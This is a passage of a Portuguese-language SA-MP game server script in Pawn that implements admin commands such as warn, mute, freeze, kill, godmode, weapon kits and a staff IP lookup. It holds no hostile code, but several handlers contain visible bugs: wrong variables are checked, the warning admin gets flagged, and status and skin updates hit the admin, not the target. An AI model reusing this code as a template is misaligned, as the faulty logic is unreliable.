            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "/verip [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(giveplayerid))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
			}
			new IP[128], nome[MAX_PLAYER_NAME];
            GetPlayerIp(id, IP, sizeof(IP));
            GetPlayerName(id, nome, sizeof(nome));
            format(string, sizeof(string), "%s [%d] IP: %s", nome, id, IP);
            SendClientMessage(playerid, 0x1E90FFAA, string);
        }
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
    if(strcmp(cmd, "/avisar", true) == 0 || strcmp(cmd, "/av", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /avisar [ID] [Aviso]");
				return 1;
            }
            new id = strval(tmp);

            MSG = strrest(cmdtext, idx);
		    if(!strlen(MSG))
			{
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /avisar [ID] [Aviso]");
			    return 1;
	     	}
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
            ++ aviso[id];
            if(aviso[id] >= 3)
            {
            	format(string, sizeof(string), "O(A) jogador(a) %s foi preso por 20 minutos por exceder o limite de avisos (3/3)", PlayerName(id));
                SendClientMessage(id, COR_ERRO, string);
                format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(id));
                WE_SetInt(gFile, "Abuser", 1);
                Algemado[id] = 0;
                SetPlayerWantedLevel(id, 0);
                pInfo[id][Preso] = 1200;
                ResetPlayerWeapons(id);
                SetPlayerInterior(id, 6);
                SetPlayerPos(id, 264.5996, 77.7367, 1001.0391) ||SetPlayerPos(id,  226.89999, 108.5, 999) || SetPlayerPos(id, 223, 108.5, 999) ||
                SetPlayerPos(id,  219, 108.5, 999) || SetPlayerPos(id, 214.7, 108.6, 999);
                KillTimer(T_Preso[id]);
                T_Preso[id] = SetTimerEx("LiberarPrisao", 1000, false, "d", id);
                pInfo[playerid][Abuser] = 1;
                return 1;
            }
            if(aInfo[playerid][Moderador] == 1)
            {
            	format(string, sizeof(string), "{FFFFFF}%s {FFF000}foi avisado(a) por {FFFFFF}%s {FFF000}pelo motivo: {FFFFFF}%s {FFF000}(Acumulando: %d/3)", PlayerName(id), PlayerName(playerid), MSG, aviso[id]);
            	SendClientMessageToAll(COR_AMARELO, string);

            	format(string, sizeof(string), "Você foi avisado(a) %d de 3 vezes, ao acumular 3 avisos, será preso(a)!", aviso[id]);
            	SendClientMessage(id, COR_AMARELO, string);
            }
            if(aInfo[playerid][Admin] == 1)
            {
            	format(string, sizeof(string), "{FFFFFF}%s {FFF000}foi avisado(a) por {FFFFFF}%s {FFF000}pelo motivo: {FFFFFF}%s {FFF000}(Acumulando: %d/3)", PlayerName(id), PlayerName(playerid), MSG, aviso[id]);
            	SendClientMessageToAll(COR_AMARELO, string);
            	format(string, sizeof(string), "Você foi avisado(a) %d de 3 vezes, ao acumular 3 avisos, será preso(a)!", aviso[id]);
            	SendClientMessage(id, COR_AMARELO, string);
            }
            if(aInfo[playerid][Ajudante] == 1)
            {
            	format(string, sizeof(string), "{FFFFFF}%s {FFF000}foi avisado(a) por {FFFFFF}%s {FFF000}pelo motivo: {FFFFFF}%s {FFF000}(Acumulando: %d/3)", PlayerName(id), PlayerName(playerid), MSG, aviso[id]);
            	SendClientMessageToAll(COR_AMARELO, string);
            	format(string, sizeof(string), "Você foi avisado(a) %d de 3 vezes, ao acumular 3 avisos, será preso(a)!", aviso[id]);
            	SendClientMessage(id, COR_AMARELO, string);
            }
            if(aInfo[playerid][Corregedor] == 1)
            {
            	format(string, sizeof(string), "{FFFFFF}%s {FFF000}foi avisado(a) por {FFFFFF}%s {FFF000}pelo motivo: {FFFFFF}%s {FFF000}(Acumulando: %d/3)", PlayerName(id), PlayerName(playerid), MSG, aviso[id]);
            	SendClientMessageToAll(COR_AMARELO, string);
            	format(string, sizeof(string), "Você foi avisado(a) %d de 3 vezes, ao acumular 3 avisos, será preso(a)!", aviso[id]);
            	SendClientMessage(id, COR_AMARELO, string);
            }
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
	if(!strcmp(cmdtext, "/cjetpack", true))
    {
		if(pInfo[playerid][Jetpack] == 1)
		{
		    SendClientMessage(playerid, COR_ERRO, "");
		    SendClientMessage(playerid, COR_BRANCO, " /Jetpack - Usa seu Jetpack");
		    SendClientMessage(playerid, COR_BRANCO, " /dJetpack - Guarda seu Jetpack");
		    SendClientMessage(playerid, COR_ERRO, "");
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não possui um Jetpack!");
		}
		return 1;
	}
    if(!strcmp(cmdtext, "/jetpack", true))
    {
		if(pInfo[playerid][Jetpack] == 1 || aInfo[playerid][Admin] == 1 || pInfo[playerid][PLAYER_VIP] == 1)
		{
			if(ParticipandoEvento[playerid] == 1 || epDM[playerid][dmParticipando] == 1)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não pode usar Jetpack no evento!");
				return 1;
			}
		    if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você já está usando seu Jetpack!");
			    return 1;
			}
            SendClientMessage(playerid, COR_AMARELO, "Jetpack criado!");
            PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USEJETPACK);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem um Jetpack!");
		}
		return 1;
    }
	if(!strcmp(cmdtext, "/djetpack", true))
	{
		if(pInfo[playerid][Jetpack] == 1 || aInfo[playerid][Admin] == 1 || pInfo[playerid][PLAYER_VIP] == 1)
		{
			new
				Float:jx, Float:jy, Float:jz
			;
			GetPlayerPos(playerid, jx, jy, jz);
			SetPlayerPos(playerid, jx, jy, jz);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
			SendClientMessage(playerid, COR_AMARELO, "Jetpack destruida!");
		}
	    else
	    {
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem um Jetpack!");
	    }
	    return 1;
	}
    if(strcmp(cmd, "/calar", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /calar [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s calou você.", sendername);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você calou O(A) jogador(a) %s", giveplayer);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) administrador(a) %s [%d] calou O(A) jogador(a) %s [%d]", sendername, playerid, giveplayer, id);
			}
            Calado[id] = true;
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(strcmp(cmd, "/descalar", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /descalar [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s descalou você.", sendername);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você descalou O(A) jogador(a) %s", giveplayer);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) administrador(a) %s [%d] descalou O(A) jogador(a) %s [%d]", sendername, playerid, giveplayer, id);
			}
            Calado[id] = false;
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(strcmp(cmd, "/congelar", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /congelar [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s lhe congelou", sendername);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você congelou O(A) jogador(a) %s", giveplayer);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) administrador(a) %s [%d] congelou O(A) jogador(a) %s [%d]", sendername, playerid, giveplayer, id);
			}
            TogglePlayerControllable(id, false);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(strcmp(cmd, "/descongelar", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /descongelar [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s lhe descongelou", sendername);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você descongelou o(a) jogador(a) %s", giveplayer);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) administrador(a) %s [%d] descongelou o(a) jogador(a) %s [%d]", sendername, playerid, giveplayer, id);
			}
            TogglePlayerControllable(id, true);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
//------------------------------- FomeSedeSono ---------------------------------
	if(strcmp(cmd, "/setfome", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1)
		{

			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{

				SendClientMessage(playerid, COR_ERRO, "Uso correto: /setfome [ID]");
				return 1;
			}
			new id = strval(tmp);
			if(!IsPlayerConnected(id))
			{

				SendClientMessage(playerid, COR_ERRO, "Ninguém online com esse ID!");
				return 1;
			}
			if(aInfo[playerid][Oculto] == false)
			{

				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				format(string, sizeof(string), "O(A) administrador(a) %s lhe setou fome (100)", sendername);
				SendClientMessage(id, COR_AMARELO, string);
				format(string, sizeof(string), "Você setou fome (100) ao jogador %s", giveplayer);
				SendClientMessage(playerid, COR_AMARELO, string);
				printf("O(A) administrador(a) %s (%d) setou fome (100) ao jogador %s (%d)", sendername, playerid, giveplayer, id);
			}
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], 100);
			SetPVarInt(id,"Fome", 100);
			mFome[id] = false;
		}
		else
		{

			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/setsede", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1)
		{

			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{

				SendClientMessage(playerid, COR_ERRO, "Uso correto: /setsede [ID]");
				return 1;
			}
			new id = strval(tmp);
			if(!IsPlayerConnected(id))
			{

				SendClientMessage(playerid, COR_ERRO, "Ninguém online com esse ID!");
				return 1;
			}
			if(aInfo[playerid][Oculto] == false)
			{

				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				format(string, sizeof(string), "O(A) administrador(a) %s lhe setou sede (100)", sendername);
				SendClientMessage(id, 0x00FF66AA, string);
				format(string, sizeof(string), "Você setou sede (100) ao jogador %s", giveplayer);
				SendClientMessage(playerid, 0x00FF66AA, string);
				printf("O(A) administrador(a) %s (%d) setou sede (100) ao jogador %s (%d)", sendername, playerid, giveplayer, id);
			}
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], 100);
			SetPVarInt(id,"Sede", 100);
			mSede[id] = false;
		}
		else
		{

			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/setsono", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1)
		{

			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{

				SendClientMessage(playerid, COR_ERRO, "Uso correto: /setsono [ID]");
				return 1;
			}
			new id = strval(tmp);
			if(!IsPlayerConnected(id))
			{

				SendClientMessage(playerid, COR_ERRO, "Ninguém online com esse ID!");
				return 1;
			}
			if(aInfo[playerid][Oculto] == false)
			{

				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				format(string, sizeof(string), "O(A) administrador(a) %s lhe setou sono (100)", sendername);
				SendClientMessage(id, 0x00FF66AA, string);
				format(string, sizeof(string), "Você setou sono (100) ao jogador %s", giveplayer);
				SendClientMessage(playerid, 0x00FF66AA, string);
				printf("O(A) administrador(a) %s (%d) setou sono (100) ao jogador %s (%d)", sendername, playerid, giveplayer, id);
			}
			SetStatusBar(playerid, BAR_SONO, Player_barSleep[playerid], 100);
			SetPVarInt(id,"Sono", 100);
		}
		else
		{

			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/setfss", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1)
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{

				SendClientMessage(playerid, COR_ERRO, "Uso correto: /setfss [ID]");
				return 1;
			}
			new id = strval(tmp);
			if(!IsPlayerConnected(id))
			{

				SendClientMessage(playerid, COR_ERRO, "Ninguém online com esse ID!");
				return 1;
			}
			if(aInfo[playerid][Oculto] == false)
			{

				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				format(string, sizeof(string), "O(A) administrador(a) %s lhe setou Fome/Sede/Sono (100)", sendername);
				SendClientMessage(id, 0x00FF66AA, string);
				format(string, sizeof(string), "Você setou Fome/Sede/Sono (100) ao jogador %s", giveplayer);
				SendClientMessage(playerid, 0x00FF66AA, string);
				printf("O(A) administrador(a) %s (%d) setou Fome/Sede/Sono (100) ao jogador %s (%d)", sendername, playerid, giveplayer, id);
			}
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], 100);
			SetPVarInt(id,"Fome", 100);
			mFome[id] = false;
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], 100);
			SetPVarInt(id,"Sede", 100);
			mSede[id] = false;
			SetStatusBar(playerid, BAR_SONO, Player_barSleep[playerid], 100);
			SetPVarInt(id,"Sono", 100);
		}
		else
		{

			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/setnofss", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1)
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{

				SendClientMessage(playerid, COR_ERRO, "Uso correto: /setnofss [ID]");
				return 1;
			}
			new id = strval(tmp);
			if(!IsPlayerConnected(id))
			{

				SendClientMessage(playerid, COR_ERRO, "Ninguém online com esse ID!");
				return 1;
			}
			if(aInfo[playerid][Oculto] == false)
			{

				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				format(string, sizeof(string), "O(A) administrador(a) %s lhe setou Fome/Sede/Sono (1)", sendername);
				SendClientMessage(id, 0x00FF66AA, string);
				format(string, sizeof(string), "Você setou Fome/Sede/Sono (1) ao jogador %s", giveplayer);
				SendClientMessage(playerid, 0x00FF66AA, string);
				printf("O(A) administrador(a) %s (%d) setou Fome/Sede/Sono (1) ao jogador %s (%d)", sendername, playerid, giveplayer, id);
			}
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], 1);
			SetPVarInt(id,"Fome", 1);
			mFome[id] = false;
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], 1);
			SetPVarInt(id,"Sede", 1);
			mSede[id] = false;
			SetStatusBar(playerid, BAR_SONO, Player_barSleep[playerid], 1);
			SetPVarInt(id,"Sono", 1);
		}
		else
		{

			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
//----------------------------------- FSS --------------------------------------

    if(strcmp(cmd, "/kill", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /kill [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s lhe matou", sendername);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você matou O(A) jogador(a) %s", giveplayer);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) administrador(a) %s [%d] matou O(A) jogador(a) %s [%d]", sendername, playerid, giveplayer, id);
			}
            SetPlayerHealth(id, 0.0);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
   	if(!strcmp(cmd, "/tapa", true))
	{
        if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /tapa [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
 			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s lhe deu um tapa", sendername);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você deu um tapa no(a) jogador(a) %s", giveplayer);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) administrador(a) %s [%d] deu um tapa no(a) jogador(a) %s [%d]", sendername, playerid, giveplayer, id);
			}
            new Float:tx, Float:ty, Float:tz;
	    	GetPlayerPos(id, tx, ty, tz);
	    	SetPlayerPos(id, tx, ty, tz+10);
        }
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/explodir", true))
	{
        if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /explodir [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
 			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s lhe explodiu", sendername);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você explodiu O(A) jogador(a) %s", giveplayer);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) administrador(a) %s [%d] explodiu O(A) jogador(a) %s [%d]", sendername, playerid, giveplayer, id);
			}
            new Float:ex, Float:ey, Float:ez;
            new vehicleid = GetPlayerVehicleID(playerid);
            GetPlayerPos(id, ex, ey, ez);
            CreateExplosion(ex+random(5), ey+random(5), ez+random(5), 6, 10.0);
            SetVehicleHealth(vehicleid, 0.0);
            SetPlayerHealth(id, 0);
        }
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
    if(!strcmp(cmd, "/vidatodos", true))
    {
  		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vidatodos [Quantia]");
				return 1;
            }
            new vida = strval(tmp);
            foreach(Player, i)
            {
				SetPlayerHealth(i, vida);
            }
            GetPlayerName(playerid, sendername, sizeof(sendername));
            format(string, sizeof(string), "O(A) administrador(a) %s setou a vida de todos para %d", sendername, vida);
            SendClientMessageToAll(0x1E90FFAA, string);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(!strcmp(cmd, "/vida", true))
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            new id = strval(tmp);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vida [ID] [Quantia]");
				return 1;
            }
            tmp = strtok(cmdtext, idx);
            new vida = strval(tmp);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vida [ID] [Quantia]");
				return 1;
            }
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
   			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s alterou sua barra de saúde para %d", sendername, vida);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você alterou a barra de saúde do(a) jogador(a) %s para %d", giveplayer, vida);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) administrador(a) %s [%d] alterou a barra de saúde do(a) jogador(a) %s [%d] para %d", sendername, playerid, giveplayer, id, vida);
			}
            SetPlayerHealth(id, vida);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(!strcmp(cmd, "/pcolete", true))
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            new id = strval(tmp);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /pcolete [ID] [Quantia]");
				return 1;
            }
            tmp = strtok(cmdtext, idx);
            new colete = strval(tmp);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /pcolete [ID] [Quantia]");
				return 1;
            }
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
   			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s alterou a quantia do seu colete para %d", sendername, colete);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você alterou a quantia de colete do(a) jogador(a) %s para %d", giveplayer, colete);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) administrador(a) %s [%d] alterou a quantia do colete do(a) jogador(a) %s [%d] para %d", sendername, playerid, giveplayer, id, colete);
			}
            SetPlayerArmour(id, colete);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(!strcmp(cmd, "/godmode", true))
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
		    	SendClientMessage(playerid, COR_ERRO, "Uso válido: /godmode [on/off]");
		    	return 1;
            }
            else if(strcmp(tmp, "on", true) == 0)
            {
                SetPlayerHealth(playerid, 9999999999.0);
                SetPlayerArmour(playerid, 9999999999.0);
                GameTextForPlayer(playerid, "~w~GODMODE: ~g~ON", 3000, 1);
                PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
            }
            else if(strcmp(tmp, "off", true) == 0)
            {
				SetPlayerHealth(playerid, 100.0);
				SetPlayerArmour(playerid, 0.0);
				GameTextForPlayer(playerid, "~w~GODMODE: ~r~OFF", 3000, 1);
				PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
            }
        }
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(!strcmp(cmd, "/godcar", true))//godcar
    {
        new pname[MAX_PLAYER_NAME];
        GetPlayerName(playerid,pname,sizeof(pname));
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
		    	SendClientMessage(playerid, COR_ERRO, "Uso válido: /godcar [on/off]");
		    	return 1;
            }
            else if(strcmp(tmp, "on", true) == 0)
            {
                godcar[playerid] = true;
                GameTextForPlayer(playerid, "~w~GODCAR: ~g~ON", 3000, 1);
                PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
                return 1;
            }
            else if(strcmp(tmp, "off", true) == 0)
            {
				godcar[playerid] = false;
				GameTextForPlayer(playerid, "~w~GODCAR: ~r~OFF", 3000, 1);
				PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
				return 1;
            }
        }
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }//gocar
	if(strcmp(cmd, "/ocultar", true) == 0)
	{
        if(aInfo[playerid][Admin] == 1)
        {
            aInfo[playerid][Oculto] = true;
            GameTextForPlayer(playerid, "~w~OCULTO ~g~ATIVADO", 3000, 1);
            PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
        }
		return 1;
	}
	if(strcmp(cmd, "/desocultar", true) == 0)
	{
        if(aInfo[playerid][Admin] == 1)
        {
            aInfo[playerid][Oculto] = false;
            GameTextForPlayer(playerid, "~w~OCULTO ~r~DESATIVADO", 3000, 1);
            PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
        }
		return 1;
	}
	if(strcmp(cmd, "/minigun", true) == 0)
	{
        if(WE_GetInt(f(playerid), "AdminL") == 1)
        {
			GivePlayerWeapon(playerid, 38, 99999);
        }
		return 1;
	}
	if(strcmp(cmd, "/adminkit", true) == 0)
	{
        if(WE_GetInt(f(playerid), "AdminL") == 1)
        {
			GivePlayerWeapon(playerid, 9, 1);
			GivePlayerWeapon(playerid, 16, 99999);
			GivePlayerWeapon(playerid, 24, 99999);
			GivePlayerWeapon(playerid, 26, 99999);
			GivePlayerWeapon(playerid, 32, 99999);
			GivePlayerWeapon(playerid, 30, 99999);
			GivePlayerWeapon(playerid, 34, 99999);
			GivePlayerWeapon(playerid, 36, 99999);
			GivePlayerWeapon(playerid, 38, 99999);
			GivePlayerWeapon(playerid, 39, 99999);
			GivePlayerWeapon(playerid, 41, 99999);
			GivePlayerWeapon(playerid, 46, 99999);
        }
		return 1;
	}
    if(strcmp(cmd, "/setarskin", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            new id = strval(tmp);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarskin [ID] [Skin]");
				return 1;
            }
            tmp = strtok(cmdtext, idx);
            new skin = strval(tmp);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarskin [ID] [Skin]");
				return 1;
            }
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
   			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s alterou sua skin para %d", sendername, skin);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você alterou a skin do(a) jogador(a) %s para %d", giveplayer, skin);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) administrador(a) %s [%d] deu a skin %d para O(A) jogador(a) %s [%d]", sendername, playerid, skin, giveplayer, id);
			}
            SetPlayerSkin(id, skin);
            WE_SetInt(f(playerid), "Skin", skin);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(strcmp(cmd, "/clima", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
		    tmp = strtok(cmdtext, idx);
	    	new clima = strval(tmp);
	    	if(!strlen(tmp))
